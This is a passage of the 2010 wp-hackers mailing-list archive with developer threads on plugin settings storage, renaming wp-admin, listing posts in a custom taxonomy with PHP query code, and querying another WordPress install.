Subject: [wp-hackers] Best practices for plugin with complicated
	settings?
In-Reply-To: <AANLkTimA2SLcgJNunxbGGr61dPi+mD0uJtwZGJQPHTtd@mail.gmail.com>
References: <8D0C461C-9FF2-4FCA-B001-EB6671DAA3A5@anca.tv>
	<AANLkTiktJfeOJubw__AWkivWKa5O78XWDCeg=tRzq8WD@mail.gmail.com>
	<AANLkTi=w03Tu-tjcVKaHQD4=uD70kFQZBcT=a-AKfcx-@mail.gmail.com>
	<AANLkTi=5p4sDhnAVmcycgZiD=HW2qZr7-1LS1v6KR5RA@mail.gmail.com>
	<AANLkTikKPeJWW0xX2VweYQ7arMGmn5S2TK-+T9hbAk8V@mail.gmail.com>
	<AANLkTimA2SLcgJNunxbGGr61dPi+mD0uJtwZGJQPHTtd@mail.gmail.com>
Message-ID: <AANLkTin1Ra1p8Zd4h_18oAVBiQ6JFrjG_rj0YycRwSb1@mail.gmail.com>

Andrew, I have specific situation I'd like your input on:

My team is currently working on the BuddyPress Media plugin
http://code.google.com/p/buddypress-media/  (previously known as BP Album+)

At present, we have 207 configuration settings consisting of mixed data
types (bool, int, string, object) that we're storing to a single WP option.
This number is probably going to increase to around 400 settings by the time
we're finished. Total stored size in the DB about 4K. The settings rarely
change after the admin has completed initial setup.

Approximately 15% of the options need to be known for each page load, but
the combinations change for every screen, and multiple screens have config
options in common. So, if we wanted to load only the settings necessary for
a given screen, we'd have to split them into roughly 150 different config
options.

Currently, we just use the WP Settings API to load our configuration object
on each plugin page load, and then we access the individual settings from
the object in memory.

Is this the most efficient way to do it? If not, how would you recommend we
implement it?

Thanks!

-Carl

From wpcustomizer at gmail.com  Mon Jul 26 07:14:51 2010
From: wpcustomizer at gmail.com (WP Customizer)
Date: Mon, 26 Jul 2010 00:14:51 -0700
Subject: [wp-hackers] Rename wp-admin problems
Message-ID: <AANLkTi=uURhZc-s36LbOoksjcO5UqT37JiOdVxOpjiht@mail.gmail.com>

So I decided I want to rename core files and folders to remove the wp-.  I
wrote a simple little program using vb .net that will recursivly edit every
file in a given directory and do a find a replace operation to change name
refrences.  For example it finds refrences to wp-login.php and changes it to
login.php.

It works, for the most part.  One issue it causes in when you rename
wp-admin.  When you access the admin if it was renamed it is visually
broken, see
http://i770.photobucket.com/albums/xx350/wpcustomizer/wp-admin.jpg. Any
ideas on what may cause this?

From ashishsainiashfame at gmail.com  Mon Jul 26 07:20:42 2010
From: ashishsainiashfame at gmail.com (Ashish Saini)
Date: Mon, 26 Jul 2010 12:50:42 +0530
Subject: [wp-hackers] Rename wp-admin problems
In-Reply-To: <AANLkTi=uURhZc-s36LbOoksjcO5UqT37JiOdVxOpjiht@mail.gmail.com>
References: <AANLkTi=uURhZc-s36LbOoksjcO5UqT37JiOdVxOpjiht@mail.gmail.com>
Message-ID: <AANLkTinBOUJvagvfmnLzNUcd9te4U+hPOOrykdVJQnNn@mail.gmail.com>

Check the link to CSS file.

Thanks & Regards
Ashish Saini aka Ashfame
(Deserve Before You Desire)
Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com | Twitter
: http://twitter.com/ashfame


On Mon, Jul 26, 2010 at 12:44 PM, WP Customizer <wpcustomizer at gmail.com>wrote:

> So I decided I want to rename core files and folders to remove the wp-.  I
> wrote a simple little program using vb .net that will recursivly edit every
> file in a given directory and do a find a replace operation to change name
> refrences.  For example it finds refrences to wp-login.php and changes it
> to
> login.php.
>
> It works, for the most part.  One issue it causes in when you rename
> wp-admin.  When you access the admin if it was renamed it is visually
> broken, see
> http://i770.photobucket.com/albums/xx350/wpcustomizer/wp-admin.jpg. Any
> ideas on what may cause this?
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From peter.westwood at ftwr.co.uk  Mon Jul 26 07:38:04 2010
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Mon, 26 Jul 2010 08:38:04 +0100 (BST)
Subject: [wp-hackers] Best practices for plugin with complicated
 settings?
In-Reply-To: <AANLkTin1Ra1p8Zd4h_18oAVBiQ6JFrjG_rj0YycRwSb1@mail.gmail.com>
References: <8D0C461C-9FF2-4FCA-B001-EB6671DAA3A5@anca.tv>
	<AANLkTiktJfeOJubw__AWkivWKa5O78XWDCeg=tRzq8WD@mail.gmail.com>
	<AANLkTi=w03Tu-tjcVKaHQD4=uD70kFQZBcT=a-AKfcx-@mail.gmail.com>
	<AANLkTi=5p4sDhnAVmcycgZiD=HW2qZr7-1LS1v6KR5RA@mail.gmail.com>
	<AANLkTikKPeJWW0xX2VweYQ7arMGmn5S2TK-+T9hbAk8V@mail.gmail.com>
	<AANLkTimA2SLcgJNunxbGGr61dPi+mD0uJtwZGJQPHTtd@mail.gmail.com>
	<AANLkTin1Ra1p8Zd4h_18oAVBiQ6JFrjG_rj0YycRwSb1@mail.gmail.com>
Message-ID: <f84e9e40d475be5a656b967e3cf87b88.squirrel@secure.ftwr.co.uk>

On Mon, July 26, 2010 8:11 am, Carl Roett wrote:
> My team is currently working on the BuddyPress Media plugin
> http://code.google.com/p/buddypress-media/  (previously known as BP
> Album+)
>
> At present, we have 207 configuration settings consisting of mixed data
> types (bool, int, string, object) that we're storing to a single WP
> option.
> This number is probably going to increase to around 400 settings by the
> time
> we're finished. Total stored size in the DB about 4K. The settings rarely
> change after the admin has completed initial setup.
>

My first response to this is - Do you /really/ need that many user
configurable options.

Consider making some decisions about how the plugin should work and more
some of them to only be configurable using filters so that in the rare
case where someone does need to change one of those settings they still
can.

Cheers

westi



From in at j-3.me  Mon Jul 26 07:45:02 2010
From: in at j-3.me (John James Jacoby)
Date: Mon, 26 Jul 2010 03:45:02 -0400
Subject: [wp-hackers] Best practices for plugin with complicated
	settings?
In-Reply-To: <f84e9e40d475be5a656b967e3cf87b88.squirrel@secure.ftwr.co.uk>
References: <8D0C461C-9FF2-4FCA-B001-EB6671DAA3A5@anca.tv>	<AANLkTiktJfeOJubw__AWkivWKa5O78XWDCeg=tRzq8WD@mail.gmail.com>	<AANLkTi=w03Tu-tjcVKaHQD4=uD70kFQZBcT=a-AKfcx-@mail.gmail.com>	<AANLkTi=5p4sDhnAVmcycgZiD=HW2qZr7-1LS1v6KR5RA@mail.gmail.com>	<AANLkTikKPeJWW0xX2VweYQ7arMGmn5S2TK-+T9hbAk8V@mail.gmail.com>	<AANLkTimA2SLcgJNunxbGGr61dPi+mD0uJtwZGJQPHTtd@mail.gmail.com>	<AANLkTin1Ra1p8Zd4h_18oAVBiQ6JFrjG_rj0YycRwSb1@mail.gmail.com>
	<f84e9e40d475be5a656b967e3cf87b88.squirrel@secure.ftwr.co.uk>
Message-ID: <000001cb2c96$75fcf620$61f6e260$@me>

Agree with Westi 100%

BuddyPress is a great example of this already, as is WordPress. 

Make yourself a default constants file and make sure it can be filtered.

Will save on serializing and/or caching the 4k back and forth when 1 small
change occurs.

If you want to keep it configurable, save only the settings that differ from
default, and wp_parse_args them at runtime?

-JJJ

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Peter Westwood
Sent: Monday, July 26, 2010 3:38 AM
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Best practices for plugin with complicated
settings?

On Mon, July 26, 2010 8:11 am, Carl Roett wrote:
> My team is currently working on the BuddyPress Media plugin
> http://code.google.com/p/buddypress-media/  (previously known as BP
> Album+)
>
> At present, we have 207 configuration settings consisting of mixed data
> types (bool, int, string, object) that we're storing to a single WP
> option.
> This number is probably going to increase to around 400 settings by the
> time
> we're finished. Total stored size in the DB about 4K. The settings rarely
> change after the admin has completed initial setup.
>

My first response to this is - Do you /really/ need that many user
configurable options.

Consider making some decisions about how the plugin should work and more
some of them to only be configurable using filters so that in the rare
case where someone does need to change one of those settings they still
can.

Cheers

westi


_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers


From wp at andrewnacin.com  Mon Jul 26 07:47:25 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Mon, 26 Jul 2010 03:47:25 -0400
Subject: [wp-hackers] Best practices for plugin with complicated
	settings?
In-Reply-To: <f84e9e40d475be5a656b967e3cf87b88.squirrel@secure.ftwr.co.uk>
References: <8D0C461C-9FF2-4FCA-B001-EB6671DAA3A5@anca.tv> 
	<AANLkTiktJfeOJubw__AWkivWKa5O78XWDCeg=tRzq8WD@mail.gmail.com> 
	<AANLkTi=w03Tu-tjcVKaHQD4=uD70kFQZBcT=a-AKfcx-@mail.gmail.com> 
	<AANLkTi=5p4sDhnAVmcycgZiD=HW2qZr7-1LS1v6KR5RA@mail.gmail.com> 
	<AANLkTikKPeJWW0xX2VweYQ7arMGmn5S2TK-+T9hbAk8V@mail.gmail.com> 
	<AANLkTimA2SLcgJNunxbGGr61dPi+mD0uJtwZGJQPHTtd@mail.gmail.com> 
	<AANLkTin1Ra1p8Zd4h_18oAVBiQ6JFrjG_rj0YycRwSb1@mail.gmail.com> 
	<f84e9e40d475be5a656b967e3cf87b88.squirrel@secure.ftwr.co.uk>
Message-ID: <AANLkTi=eXEiaSB-pGx8p=CGVQ+66L4q7t+dyhSJd8mOx@mail.gmail.com>

On Mon, Jul 26, 2010 at 3:38 AM, Peter Westwood
<peter.westwood at ftwr.co.uk>wrote:

> On Mon, July 26, 2010 8:11 am, Carl Roett wrote:
> > My team is currently working on the BuddyPress Media plugin
> > http://code.google.com/p/buddypress-media/  (previously known as BP
> > Album+)
> >
> > At present, we have 207 configuration settings consisting of mixed data
> > types (bool, int, string, object) that we're storing to a single WP
> > option.
> > This number is probably going to increase to around 400 settings by the
> > time
> > we're finished. Total stored size in the DB about 4K. The settings rarely
> > change after the admin has completed initial setup.
> >
>
> My first response to this is - Do you /really/ need that many user
> configurable options.
>
> Consider making some decisions about how the plugin should work and more
> some of them to only be configurable using filters so that in the rare
> case where someone does need to change one of those settings they still
> can.
>

I strongly second Peter here. Make decisions, not options. You're building
on top of BuddyPress, so you can offer your own filters and keep many
options out of the UI.

Also, I took a very cursory look at the plugin and noticed you weren't using
the settings API, at least not yet.

From wp at andrewnacin.com  Mon Jul 26 07:50:46 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Mon, 26 Jul 2010 03:50:46 -0400
Subject: [wp-hackers] Rename wp-admin problems
In-Reply-To: <AANLkTi=uURhZc-s36LbOoksjcO5UqT37JiOdVxOpjiht@mail.gmail.com>
References: <AANLkTi=uURhZc-s36LbOoksjcO5UqT37JiOdVxOpjiht@mail.gmail.com>
Message-ID: <AANLkTimSCAW4Ny=uxyPmMWNOhzSaWn-2NWyZumJjuDmB@mail.gmail.com>

On Mon, Jul 26, 2010 at 3:14 AM, WP Customizer <wpcustomizer at gmail.com>wrote:

> So I decided I want to rename core files and folders to remove the wp-.  I
> wrote a simple little program using vb .net that will recursivly edit every
> file in a given directory and do a find a replace operation to change name
> refrences.  For example it finds refrences to wp-login.php and changes it
> to
> login.php.
>

FYI, renaming wp-admin is not supported. Core doesn't support it. Most
plugins don't support it. And doing a find and replace will only hinder you
or your client when you decide to upgrade in the future.

If this is partly a security consideration, it would be much better to lock
down your wp-admin directory by IP, HTTP authentication, or the like.

From wpcustomizer at gmail.com  Mon Jul 26 08:03:42 2010
From: wpcustomizer at gmail.com (WP Customizer)
Date: Mon, 26 Jul 2010 01:03:42 -0700
Subject: [wp-hackers] Rename wp-admin problems
In-Reply-To: <AANLkTimSCAW4Ny=uxyPmMWNOhzSaWn-2NWyZumJjuDmB@mail.gmail.com>
References: <AANLkTi=uURhZc-s36LbOoksjcO5UqT37JiOdVxOpjiht@mail.gmail.com>
	<AANLkTimSCAW4Ny=uxyPmMWNOhzSaWn-2NWyZumJjuDmB@mail.gmail.com>
Message-ID: <AANLkTinPe5qrgRpXpgdNE0xVO9_py4y3kC=PSiELc=Bk@mail.gmail.com>

Well the idea is i would use find and replace to change all the refrences
from wp-admin to whatever I choose to name it.  My find and replace should
work on plugins, and upgrades as well as it automated using vb .net so it
literally only takes seconds to complete even on the hundreds of php files
in the wordpress core.

It's mostly an annoyance at WP being everywhere in filenames, ect.  Wht was
wordpress ever written this way, IMO it should use generic names like admin,
login,php, ect.  I know these changes I am attempting aren't officially
supported so I thought i'd try here to see if anyone might know what would
cause such a problem.  BEcause it's find a replace every refrence to
wp-admin is changed, including css.

On Mon, Jul 26, 2010 at 12:50 AM, Andrew Nacin <wp at andrewnacin.com> wrote:

> On Mon, Jul 26, 2010 at 3:14 AM, WP Customizer <wpcustomizer at gmail.com
> >wrote:
>
> > So I decided I want to rename core files and folders to remove the wp-.
>  I
> > wrote a simple little program using vb .net that will recursivly edit
> every
> > file in a given directory and do a find a replace operation to change
> name
> > refrences.  For example it finds refrences to wp-login.php and changes it
> > to
> > login.php.
> >
>
> FYI, renaming wp-admin is not supported. Core doesn't support it. Most
> plugins don't support it. And doing a find and replace will only hinder you
> or your client when you decide to upgrade in the future.
>
> If this is partly a security consideration, it would be much better to lock
> down your wp-admin directory by IP, HTTP authentication, or the like.
>  _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From KrisY at tbs.uk.com  Mon Jul 26 09:20:10 2010
From: KrisY at tbs.uk.com (Kris Young)
Date: Mon, 26 Jul 2010 10:20:10 +0100
Subject: [wp-hackers]  Custom post types - a multitude of problems
In-Reply-To: <AANLkTinPe5qrgRpXpgdNE0xVO9_py4y3kC=PSiELc=Bk@mail.gmail.com>
References: <AANLkTi=uURhZc-s36LbOoksjcO5UqT37JiOdVxOpjiht@mail.gmail.com><AANLkTimSCAW4Ny=uxyPmMWNOhzSaWn-2NWyZumJjuDmB@mail.gmail.com>
	<AANLkTinPe5qrgRpXpgdNE0xVO9_py4y3kC=PSiELc=Bk@mail.gmail.com>
Message-ID: <CD47955B7E065D48AB5CF226C2ED75C02E3198@tbs-sbs01.TBS.local>

Hi there,

I need to output the contents (all posts, all content of those posts) of
a specific custom category (taxonomy) and I have no idea how to get it
done. All I want is a page that outputs all the posts for a certain
category (and that category only) that I created using this code:

register_taxonomy("clients", array("portfolio_item"),
array("hierarchical" => true, "label" => "Clients", "singular_label" =>
"Client", "rewrite" => array('slug'=>'portfolio_item')));

Yes, that part was simple, but for some reason my custom taxonomy is
completely separate from the rest of the site and irretrievable. Can't
figure out for the life of me how to do this.

Kris

From Gavin.Pearce at 3seven9.com  Mon Jul 26 09:38:54 2010
From: Gavin.Pearce at 3seven9.com (Gavin Pearce)
Date: Mon, 26 Jul 2010 10:38:54 +0100
Subject: [wp-hackers] Custom post types - a multitude of problems
In-Reply-To: <CD47955B7E065D48AB5CF226C2ED75C02E3198@tbs-sbs01.TBS.local>
References: <AANLkTi=uURhZc-s36LbOoksjcO5UqT37JiOdVxOpjiht@mail.gmail.com><AANLkTimSCAW4Ny=uxyPmMWNOhzSaWn-2NWyZumJjuDmB@mail.gmail.com><AANLkTinPe5qrgRpXpgdNE0xVO9_py4y3kC=PSiELc=Bk@mail.gmail.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E3198@tbs-sbs01.TBS.local>
Message-ID: <CD47955B7E065D48AB5CF226C2ED75C02E319A@tbs-sbs01.TBS.local>

Show 10 posts with the term "Will Smith" (from your 'people' taxonomy).

Before 'The Loop':
<?php query_posts( array( 'people' => 'will-smith', 'showposts' => 10 )
); ?>

Then just run the loop like normal. Let me know if I'm missing the point
- it is Monday morning. ;)

Gav


-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Kris Young
Sent: 26 July 2010 10:20
To: wp-hackers at lists.automattic.com
Subject: [wp-hackers] Custom post types - a multitude of problems

Hi there,

I need to output the contents (all posts, all content of those posts) of
a specific custom category (taxonomy) and I have no idea how to get it
done. All I want is a page that outputs all the posts for a certain
category (and that category only) that I created using this code:

register_taxonomy("clients", array("portfolio_item"),
array("hierarchical" => true, "label" => "Clients", "singular_label" =>
"Client", "rewrite" => array('slug'=>'portfolio_item')));

Yes, that part was simple, but for some reason my custom taxonomy is
completely separate from the rest of the site and irretrievable. Can't
figure out for the life of me how to do this.

Kris
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From carlroett at gmail.com  Mon Jul 26 09:39:24 2010
From: carlroett at gmail.com (Carl Roett)
Date: Mon, 26 Jul 2010 03:39:24 -0600
Subject: [wp-hackers] Best practices for plugin with complicated
	settings?
In-Reply-To: <AANLkTi=eXEiaSB-pGx8p=CGVQ+66L4q7t+dyhSJd8mOx@mail.gmail.com>
References: <8D0C461C-9FF2-4FCA-B001-EB6671DAA3A5@anca.tv>
	<AANLkTiktJfeOJubw__AWkivWKa5O78XWDCeg=tRzq8WD@mail.gmail.com>
	<AANLkTi=w03Tu-tjcVKaHQD4=uD70kFQZBcT=a-AKfcx-@mail.gmail.com>
	<AANLkTi=5p4sDhnAVmcycgZiD=HW2qZr7-1LS1v6KR5RA@mail.gmail.com>
	<AANLkTikKPeJWW0xX2VweYQ7arMGmn5S2TK-+T9hbAk8V@mail.gmail.com>
	<AANLkTimA2SLcgJNunxbGGr61dPi+mD0uJtwZGJQPHTtd@mail.gmail.com>
	<AANLkTin1Ra1p8Zd4h_18oAVBiQ6JFrjG_rj0YycRwSb1@mail.gmail.com>
	<f84e9e40d475be5a656b967e3cf87b88.squirrel@secure.ftwr.co.uk>
	<AANLkTi=eXEiaSB-pGx8p=CGVQ+66L4q7t+dyhSJd8mOx@mail.gmail.com>
Message-ID: <AANLkTimBXAY9hp6Mv53e794ex6hazK=AVQOi5dsrV8h4@mail.gmail.com>

Peter, JJJ, Andrew ...thanks for your comments.

1) Number of options.

It's the classic software development scenario ...each user only needs a few
options, but all of them need *different* options. Somebody using the plugin
for an application like deviantART <http://www.deviantart.com/> will want
things configured very differently from a user trying to emulate Facebook,
or a user trying to emulate LinkedIn. All of these sites have the same group
of "core" media functions. It is the application of rules, which in our case
are set by config options, that makes a site what it is.

Stacked on top of that is the fact BuddyPress Media is a large, complicated
plugin that does a lot of different things, and most features have several
configuration options.

I should probably mention that 207 options is with *every* feature enabled.
As with BuddyPress, not all installations will use all features; but also as
with BuddyPress, a large portion of the features are interdependent, so we
can't split it into a bunch of different plugins,

So yes, I'd say 90% of the config options currently there are necessary.

2) Config Files and Filters

The next time we give our code a really careful review, I think we might be
able to switch a few more things over to using filters, but most options
that (at least from what we know) can be set that way already are. The
majority of our config options are things like:

Which users can add tags to media items: "item owner" | "friends" |
"everyone"
Allow comments on media items: "yes" | "no"

So they're not really the kind of thing you would set in a template or when
calling a function.

...but

They're exactly the sort of values you would store in a config file, much as
WordPress and BuddyPress do with their various config files.

Knowing our *current* user base (I spent 20 hours doing support last week),
having users directly edit a config file would not end well ...but if we
could get the plugin to write the values (taken from the config screens)
into a PHP file, like the WordPress installer does, we might have a winning
solution.

So...

a) What would you guys estimate the speed increase would be if we just read
the values in as PHP constants instead of pulling them from the database?

b) Based on your experience, would trying to do this with a file in the
wp-plugins directory cause epic file permissions drama on a significant
number of wp installations?

3) "I took a very cursory look at the plugin and noticed you weren't using
the settings API, at least not yet."

Thanks! ...wow...that was above the call of duty!

I suppose a more accurate statement would have been "I have the code open on
my workstation and I'm experimenting with the Config API, and I haven't
committed it to the SVN yet". I wasn't expecting anyone to download the
trunk and give us a code review ...although feedback is always welcome and
appreciated.

The most current version is here
http://code.google.com/p/buddypress-media/source/checkout

<http://code.google.com/p/buddypress-media/source/checkout>in
bp_media/branches/foxly/nightly   ...but I'll probably be updating the trunk
later today.


So no, there are no Config API calls in there yet.

I thought it would be better to put this question to the experts before
burning time coding something. Based on watching this list for like, a year
...you guys are unequivocally brilliant, and consistently come up with
solutions I'd never have thought of.

Thanks!

-Carl

From mikeschinkel at newclarity.net  Mon Jul 26 10:06:14 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 26 Jul 2010 06:06:14 -0400
Subject: [wp-hackers] Custom post types - a multitude of problems
In-Reply-To: <CD47955B7E065D48AB5CF226C2ED75C02E3198@tbs-sbs01.TBS.local>
References: <AANLkTi=uURhZc-s36LbOoksjcO5UqT37JiOdVxOpjiht@mail.gmail.com><AANLkTimSCAW4Ny=uxyPmMWNOhzSaWn-2NWyZumJjuDmB@mail.gmail.com>
	<AANLkTinPe5qrgRpXpgdNE0xVO9_py4y3kC=PSiELc=Bk@mail.gmail.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E3198@tbs-sbs01.TBS.local>
Message-ID: <F70451A1-2EFF-4911-BD5C-ACC86CF452E7@newclarity.net>

On Jul 26, 2010, at 5:20 AM, Kris Young wrote:
> I need to output the contents (all posts, all content of those posts) of
> a specific custom category (taxonomy) and I have no idea how to get it
> done. All I want is a page that outputs all the posts for a certain
> category (and that category only) that I created using this code:
> 
> register_taxonomy("clients", array("portfolio_item"),
> array("hierarchical" => true, "label" => "Clients", "singular_label" =>
> "Client", "rewrite" => array('slug'=>'portfolio_item')));
> 
> Yes, that part was simple, but for some reason my custom taxonomy is
> completely separate from the rest of the site and irretrievable. Can't
> figure out for the life of me how to do this.

To start, I think you have your taxonomy registration wrong. (FWIW my preference would be to go with a singular for the taxonomy name, e.g. "client" but I'll leave yours as is):

  $labels = array(
    'name' => _x( 'Clients', 'taxonomy general name' ),
    'singular_name' => _x( 'Client', 'taxonomy singular name' ),
    'search_items' =>  __( 'Search Clients' ),
    'all_items' => __( 'All Clients' ),
    'parent_item' => __( 'Parent Client' ),
    'parent_item_colon' => __( 'Parent Client:' ),
    'edit_item' => __( 'Edit Client' ), 
    'update_item' => __( 'Update Client' ),
    'add_new_item' => __( 'Add New Client' ),
    'new_item_name' => __( 'New Client Name' ),
  ); 

register_taxonomy("clients", array("portfolio_item"),array(
	"hierarchical" => true, 
	"labels" => $labels, 
	"public" => true, 
	"show_ui" => true, 
	"query_var" => "clients", 
	"rewrite" => array('slug'=>'client'),
));

Many of these options will default but I went ahead and listed them all.  Read more here: 

http://codex.wordpress.org/Function_Reference/register_taxonomy

As for the rest of your question, I'm unclear.  Do you want all Portfolio Items that have *any* clients, or a specific client?  For a specific client i.e. "john-smith" I think this would be what you need (though I haven't run the code so it may have typos):

<?php
$portfolio_items = new WP_Query('post_type=portfolio_item&taxonomy=clients&term=john-smith&posts_per_page=-1');
if ( $portfolio_items->have_posts() ): 
	while ( $portfolio_items->have_posts() ) : $portfolio_items->the_post(); ?>
		<h2 id="post-<?php the_ID(); ?>" <?php post_class(); ?>><?php the_title(); ?></h2>
		<?php the_content(); 
	endwhile; 
endif; 

If you want to get all portfolio items that have *any* clients I've actually not done that before so I'll have to let someone else answer.

HTH.

-Mike

From ashishsainiashfame at gmail.com  Mon Jul 26 11:38:30 2010
From: ashishsainiashfame at gmail.com (Ashish Saini)
Date: Mon, 26 Jul 2010 17:08:30 +0530
Subject: [wp-hackers] Querying posts of another WordPress install
Message-ID: <AANLkTi=CHq9bUukSa19MgJVSUU1CuQYfzUj6RBvmy3NS@mail.gmail.com>

Hi,

Is there any way that I can query posts from another WordPress install
residing in the same database? I know it can be done via SQL queries but is
there any workaround hacking my way along with API?

Thanks & Regards
Ashish Saini aka Ashfame
(Deserve Before You Desire)
Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com | Twitter
: http://twitter.com/ashfame

From ashishsainiashfame at gmail.com  Mon Jul 26 11:42:22 2010
From: ashishsainiashfame at gmail.com (Ashish Saini)
Date: Mon, 26 Jul 2010 17:12:22 +0530
Subject: [wp-hackers] Querying posts of another WordPress install
In-Reply-To: <AANLkTi=CHq9bUukSa19MgJVSUU1CuQYfzUj6RBvmy3NS@mail.gmail.com>
References: <AANLkTi=CHq9bUukSa19MgJVSUU1CuQYfzUj6RBvmy3NS@mail.gmail.com>
Message-ID: <AANLkTimmte-eFUkmk2w3KsaZpWkHCKtD=pxU4OnPj0XA@mail.gmail.com>

I think this can be done with the help of setup_postdata() by populating the
fields as explained here -
http://codex.wordpress.org/Displaying_Posts_Using_a_Custom_Select_Query

Right? And is this the best approach?

Thanks & Regards
Ashish Saini aka Ashfame
(Deserve Before You Desire)
Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com | Twitter
: http://twitter.com/ashfame


On Mon, Jul 26, 2010 at 5:08 PM, Ashish Saini
<ashishsainiashfame at gmail.com>wrote:

> Hi,
>
> Is there any way that I can query posts from another WordPress install
> residing in the same database? I know it can be done via SQL queries but is
> there any workaround hacking my way along with API?
>
> Thanks & Regards
> Ashish Saini aka Ashfame
> (Deserve Before You Desire)
> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
> Twitter : http://twitter.com/ashfame
>

From aaron at jorb.in  Mon Jul 26 11:56:17 2010
From: aaron at jorb.in (Aaron Jorbin)
Date: Mon, 26 Jul 2010 07:56:17 -0400
Subject: [wp-hackers] Querying posts of another WordPress install
In-Reply-To: <AANLkTimmte-eFUkmk2w3KsaZpWkHCKtD=pxU4OnPj0XA@mail.gmail.com>
References: <AANLkTi=CHq9bUukSa19MgJVSUU1CuQYfzUj6RBvmy3NS@mail.gmail.com> 
	<AANLkTimmte-eFUkmk2w3KsaZpWkHCKtD=pxU4OnPj0XA@mail.gmail.com>
Message-ID: <AANLkTin6x+4NT6E6bxR=1Xq43D6txPhT0et2xnK_45Nt@mail.gmail.com>

Is this using Multisite?  If so, you can use switch_to_blog -
http://codex.wordpress.org/WPMU_Functions/switch_to_blog and it's
counterpart restore_current_blog -
http://codex.wordpress.org/WPMU_Functions/restore_current_blog to move
around use the api.



http://aaron.jorb.in
twitter: twitter.com/aaronjorbin


On Mon, Jul 26, 2010 at 7:42 AM, Ashish Saini
<ashishsainiashfame at gmail.com>wrote:

> I think this can be done with the help of setup_postdata() by populating
> the
> fields as explained here -
> http://codex.wordpress.org/Displaying_Posts_Using_a_Custom_Select_Query
>
> Right? And is this the best approach?
>
> Thanks & Regards
> Ashish Saini aka Ashfame
> (Deserve Before You Desire)
> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
> Twitter
> : http://twitter.com/ashfame
>
>
> On Mon, Jul 26, 2010 at 5:08 PM, Ashish Saini
> <ashishsainiashfame at gmail.com>wrote:
>
> > Hi,
> >
> > Is there any way that I can query posts from another WordPress install
> > residing in the same database? I know it can be done via SQL queries but
> is
> > there any workaround hacking my way along with API?
> >
> > Thanks & Regards
> > Ashish Saini aka Ashfame
> > (Deserve Before You Desire)
> > Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
> > Twitter : http://twitter.com/ashfame
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From jaredwilli at gmail.com  Mon Jul 26 13:23:23 2010
From: jaredwilli at gmail.com (Jared Williams)
Date: Mon, 26 Jul 2010 09:23:23 -0400
Subject: [wp-hackers] wp-hackers Digest, Vol 66, Issue 101
In-Reply-To: <mailman.11.1280145602.13432.wp-hackers@lists.automattic.com>
References: <mailman.11.1280145602.13432.wp-hackers@lists.automattic.com>
Message-ID: <AANLkTinuEOPfaH+Rn4TQs4id7GehgrJA0t4OPgvWfae2@mail.gmail.com>

I have a wp_nav_menu, and it has two top level pages that have a bunch of
terms I've created for two custom taxonomies, which are for the two top
level pages. I'm trying to figure out how I can hide the terms from the drop
down menu I made that shows the terms, if there are no posts assigned to a
term of the taxonomies. Is this possible? It doesn't seem like it is.


As for Kris Young's question about showing all posts of a taxonomy, this is
a problem I ran into as well, and searched for a long time and found it very
hard to figure out.

What I managed to do is list all terms for a taxonomy, and all the posts for
each term individually. You may be able to hack this to do what you're
trying to do since it is the same as what I needed to do I just didn't have
time to make it list only the posts for the taxonomy.


<?php
// Create list of taxonomy terms and list the posts under each term
$post_type = 'post';
$tax = 'your_custom_taxonomy';
$tax_terms = get_terms( $tax );
if ($tax_terms) {
    foreach ($tax_terms  as $tax_term) {
    $args = array(
        'post_type' => $post_type,
        "tax" => $tax_term->slug,
        'post_status' => 'publish',
        'posts_per_page' => -1,
        'caller_get_posts'=> 1
    );

        $my_query = null;
        $my_query = new WP_Query($args);

        if( $my_query->have_posts() ) : ?>

            <h2 class="breadcrumb">All <?php echo $tax; ?> Posts For <?php
echo $tax_term->name; ?></h2>
            <ul class="taxlist">
            <?php while ( $my_query->have_posts() ) : $my_query->the_post();
?>

                <li id="post-<?php the_ID(); ?>">
                    <a href="<?php the_permalink(); ?>" rel="bookmark"
title="Permanent Link to <?php the_title_attribute(); ?>"><?php the_title();
?></a>
                </li>


            <?php endwhile; // end of loop ?>
            </ul>

            <?php if( function_exists('wp_pagenavi')) { wp_pagenavi(); }
else { ?>
                <div class="navigation clearfix">
                    <div class="alignleft"><?php next_posts_link('&laquo;
Previous Entries') ?></div>
                    <div class="alignright"><?php previous_posts_link('Next
Entries &raquo;') ?></div>
                </div>
            <?php } ?>

        <?php else : ?>

            <h2 class="title">Oops</h2>
            <p>Looks like something is missing...</p>

        <?php endif; // if have_posts()
        wp_reset_query();

    } // end foreach #tax_terms
}
?>

Hope this helps.

Jared Williams


On Mon, Jul 26, 2010 at 8:00 AM, <wp-hackers-request at lists.automattic.com>wrote:

> Send wp-hackers mailing list submissions to
>        wp-hackers at lists.automattic.com
>
> To subscribe or unsubscribe via the World Wide Web, visit
>        http://lists.automattic.com/mailman/listinfo/wp-hackers
> or, via email, send a message with subject or body 'help' to
>        wp-hackers-request at lists.automattic.com
>
> You can reach the person managing the list at
>        wp-hackers-owner at lists.automattic.com
>
> When replying, please edit your Subject line so it is more specific
> than "Re: Contents of wp-hackers digest..."
>
>
> Today's Topics:
>
